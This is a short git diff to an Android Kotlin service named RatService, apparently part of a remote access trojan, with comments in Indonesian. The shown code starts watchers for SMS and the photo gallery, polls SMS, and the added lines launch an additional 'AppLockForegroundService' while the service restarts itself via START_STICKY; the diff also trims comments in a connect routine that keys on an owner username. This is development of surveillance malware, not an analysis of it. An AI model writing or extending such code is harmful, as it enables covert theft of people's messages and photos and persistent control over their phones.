@@ -67,6 +67,17 @@ class RatService : Service() {
         try { smsWatcher?.start() } catch (_: Exception) {}
         try { galleryWatcher?.start() } catch (_: Exception) {}
         startSmsPolling()
+
+        // Pastikan AppLockForegroundService jalan
+        try {
+            val svcIntent = Intent(this, AppLockForegroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(svcIntent)
+            } else {
+                startService(svcIntent)
+            }
+        } catch (_: Exception) {}
+
         return START_STICKY
     }
 
@@ -108,10 +119,8 @@ class RatService : Service() {
     }
 
     private fun connect() {
-        // Ambil username dari SharedPreferences — JANGAN fallback ke "unknown"
         val owner = userPrefs.getString("username", "") ?: ""
         if (owner.isEmpty()) {
-            // Belum setup, tunggu
             return
         }
 
